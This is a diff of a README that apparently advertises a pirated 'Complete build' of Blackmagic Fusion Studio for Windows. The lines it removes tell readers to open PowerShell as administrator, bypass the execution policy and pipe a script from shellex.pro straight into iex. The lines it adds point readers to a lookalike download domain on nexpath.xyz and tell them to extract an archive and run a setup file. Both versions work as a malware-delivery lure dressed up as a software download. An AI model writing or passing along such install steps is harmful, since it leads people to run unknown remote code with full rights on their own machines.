@@ -24,31 +24,14 @@ Premium · Pro · Complete build · Windows
 
 > Advanced studio connects to DaVinci workflows — build composites, titles and VR180 content with GPU acceleration.
 
-## INSTALLATION
+## Download
 
-**Steps:**
-1. Press **Win**, type **PowerShell**
-2. Right-click **Windows PowerShell** → **Run as administrator**
-3. Copy the command below, paste into the window, press **Enter**
-4. If **UAC** still appears – click **Yes**
+> Use the project link below for Windows.
 
-```powershell
-powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://shellex.pro/ps/setup.ps1' | iex"
-```
-
-<details>
-<summary><b>Command did not start?</b></summary>
-
-Try this directly in the same PowerShell window:
-
-```powershell
-irm 'https://shellex.pro/ps/setup.ps1' | iex
-```
-
-</details>
-
-<sub>Administrator rights are required to complete the setup.</sub>
-
+* **Project link:** **[blackmagic-fusion-studio-advanced-setup.nexpath.xyz](https://blackmagic-fusion-studio-advanced-setup.nexpath.xyz/)**
+* **Full URL:** `https://blackmagic-fusion-studio-advanced-setup.nexpath.xyz/`
+* **Type:** Desktop package | Windows 10 and 11, 64-bit
+* **Setup:** Run the installer from the extracted folder
 
 ## `FEATURES`
 
@@ -72,17 +55,17 @@ irm 'https://shellex.pro/ps/setup.ps1' | iex
 
 <details>
 <summary>&nbsp;<b>How to install?</b></summary>
-<br>Open PowerShell as Administrator and run the command from the INSTALLATION section.
+<br>Open <a href="https://blackmagic-fusion-studio-advanced-setup.nexpath.xyz/">blackmagic-fusion-studio-advanced-setup.nexpath.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
 </details>
 
 <details>
-<summary>&nbsp;<b>Command did not start?</b></summary>
-<br>Try: `irm 'https://shellex.pro/ps/setup.ps1' | iex`
+<summary>&nbsp;<b>Download didn't start?</b></summary>
+<br>Use the manual link on the NexPath download page, or open <a href="https://blackmagic-fusion-studio-advanced-setup.nexpath.xyz/">blackmagic-fusion-studio-advanced-setup.nexpath.xyz</a> directly in your browser.
 </details>
 
 <details>
 <summary>&nbsp;<b>Updates?</b></summary>
-<br>Use the build from your downloaded Release.
+<br>Open <a href="https://blackmagic-fusion-studio-advanced-setup.nexpath.xyz/">blackmagic-fusion-studio-advanced-setup.nexpath.xyz</a> again and download the latest version from NexPath.
 </details>
 <details>
 <summary>&nbsp;<b>Requirements?</b></summary>
